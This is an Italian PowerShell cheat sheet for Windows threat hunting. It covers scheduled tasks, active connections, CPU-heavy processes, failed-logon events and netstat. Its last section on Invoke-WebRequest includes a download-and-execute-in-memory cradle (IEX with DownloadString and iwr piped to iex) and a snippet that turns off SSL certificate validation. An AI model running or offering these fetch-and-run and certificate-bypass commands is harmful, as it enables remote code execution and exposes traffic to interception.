# Comandi Utili PowerShell per Ricognizione e Sicurezza

Questo documento contiene una raccolta di comandi PowerShell utili per l'analisi e il monitoraggio locale di sistemi Windows (utili per attività di Threat Hunting e verifica di sicurezza).

---

## 1. Ricerca Attività Pianificate

Elenca le attività pianificate pronte per l'esecuzione. Utile per individuare meccanismi di persistenza non autorizzati sul sistema.

### Comando:
```powershell
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

### Flag e Parametri:
* **`Where-Object`**: Filtra i risultati in base a una condizione definita.
* **`$_.State -eq "Ready"`**: Seleziona solo le attività nello stato *Ready* (pronte ad attivarsi).
* **`-TaskPath`**: Filtra per percorso specifico della cartella delle attività (es. `\Microsoft\Windows\`).
* **`-TaskName`**: Consente di interrogare una specifica attività di cui si conosce il nome.

### Panoramica:
Le attività pianificate sono spesso utilizzate per automatizzare processi legittimi, ma possono anche essere sfruttate dagli attaccanti per mantenere la persistenza su un sistema compromesso. È consigliabile controllare i nomi generici o poco descrittivi, così come le attività collocate in percorsi personalizzati o non standard. L'analisi può essere approfondita con `Get-ScheduledTaskInfo` per controllare l'orario di ultima esecuzione e la prossima attivazione.

---

## 2. Lista Connessioni Attive

Mostra tutte le connessioni TCP attualmente stabilite sul sistema.

### Comando:
```powershell
Get-NetTCPConnection -State Established
```

### Flag e Parametri:
* **`-State`**: Filtra lo stato della connessione (es. *Established*, *Listen*, *TimeWait*).
* **`-RemotePort`**: Filtra in base alla porta remota (es. `443`, `80`).
* **`-LocalPort`**: Filtra per porta locale.
* **`-OwningProcess`**: Mostra il PID (Process ID) del processo specifico che ha aperto la connessione.

### Panoramica:
Questo comando mostra le connessioni attive verso server remoti. Incrociando il PID del processo proprietario ottenuto con il comando `Get-Process`, è possibile risalire a quale applicazione sta comunicando con l'esterno. È un passaggio fondamentale nelle analisi di sicurezza per individuare possibili canali di Command & Control (C2) o traffico anomalo in uscita.

---

## 3. Trova Processi ad Alto Utilizzo CPU

Elenca i primi 10 processi che consumano più risorse di CPU sul sistema.

### Comando:
```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

### Flag e Parametri:
* **`Sort-Object CPU`**: Ordina i processi in base al consumo di tempo CPU.
* **`-Descending`**: Ordina l'output in ordine decrescente (i valori più alti per primi).
* **`Select-Object`**: Consente di limitare o formattare il set di dati di output.
* **`-First 10`**: Restituisce solo i primi 10 elementi dell'elenco.
* **`Where-Object`**: Può essere aggiunto per escludere processi noti o filtrare per nome.

### Panoramica:
Questo comando è utile per individuare processi che stanno consumando molte risorse o che mostrano comportamenti anomali. Ad esempio, la presenza di un processo come `MsMpEng.exe` (Windows Defender) con consumo elevato può indicare scansioni attive, mentre processi sconosciuti con consumo CPU stabile ed elevato potrebbero meritare un'analisi tramite identificazione del PID o ispezione del binario.

---

## 4. Ricerca Tentativi di Accesso Falliti

Analizza il registro di sicurezza di Windows alla ricerca di eventi di accesso negato.

### Comando:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 10
```

### Flag e Parametri:
* **`-FilterHashtable`**: Esegue filtri rapidi basati su coppie chiave-valore nel registro eventi.
* **`LogName='Security'`**: Specifica il registro di sicurezza di Windows.
* **`Id=4625`**: Identifica in modo univoco l'evento di *Logon Fallito* (Failed Logon).
* **`-MaxEvents 10`**: Limita il numero massimo di eventi restituiti (es. gli ultimi 10).
* **`-Oldest`**: Restituisce per primi gli eventi più vecchi nell'intervallo temporale.

### Panoramica:
Il comando interroga il registro eventi alla ricerca dell'ID `4625`, che corrisponde a tentativi di accesso falliti. Una sequenza ravvicinata di questi eventi può indicare tentativi di accesso automatizzati non autorizzati (es. brute force o password spraying). Per un'analisi più approfondita, è possibile espandere il campo *Message* dell'evento per identificare lo username target, l'indirizzo IP di provenienza e il tipo di logon utilizzato.

---

## 5. Altri Comandi Windows Utili

Questi sono comandi nativi di Windows (cmd.exe) che possono essere eseguiti anche all'interno di una sessione PowerShell per attività rapide di enumerazione:

### A. Dettagli Utente Specifico
Mostra i dettagli completi relativi a un account utente locale o di dominio, inclusa l'appartenenza a gruppi e le impostazioni di scadenza/cambio password:
```powershell
net user "nomeutente"
```

### B. Elenco Connessioni TCP Attive con PID
Elenca tutte le connessioni TCP attive sul sistema, mostrando gli indirizzi remoti, le porte e il relativo ID del processo (PID) per ciascuna di esse:
```powershell
netstat -ano -p tcp
```

---

## 6. Esempi di Invoke-WebRequest (iwr)

`Invoke-WebRequest` (noto anche con l'alias `iwr`) è il cmdlet PowerShell equivalente a `curl` o `wget` per interagire con i server web e scaricare risorse.

### A. Download di un File e Salvataggio Locale
Scarica un file da un indirizzo remoto e lo memorizza nel percorso specificato sul disco:
```powershell
Invoke-WebRequest -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"
# Oppure in forma abbreviata:
iwr -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"
```

### B. Download ed Esecuzione in Memoria (IEX)
Scarica uno script PowerShell remoto e lo esegue direttamente in memoria senza salvarlo sul disco (utilizzando `Invoke-Expression` o `iex`):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')
# Oppure tramite iwr (PowerShell v3+):
iwr -UseBasicParsing "http://example.com/script.ps1" | iex
```

### C. Visualizzazione dei Dettagli di Risposta
Esegue una richiesta HTTP GET per esaminare il corpo del messaggio o i metadati delle intestazioni (Headers):
```powershell
# Legge il contenuto testuale grezzo della risposta
(Invoke-WebRequest -Uri "http://example.com").Content

# Estrae solo gli header di risposta HTTP
(Invoke-WebRequest -Uri "http://example.com").Headers
```

### D. Bypassare Errori di Certificato SSL (Self-Signed)
Forza PowerShell a ignorare eventuali errori dovuti a certificati SSL scaduti o non emessi da un'autorità riconosciuta:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iwr -Uri "https://target-con-ssl-non-valido.com"
```
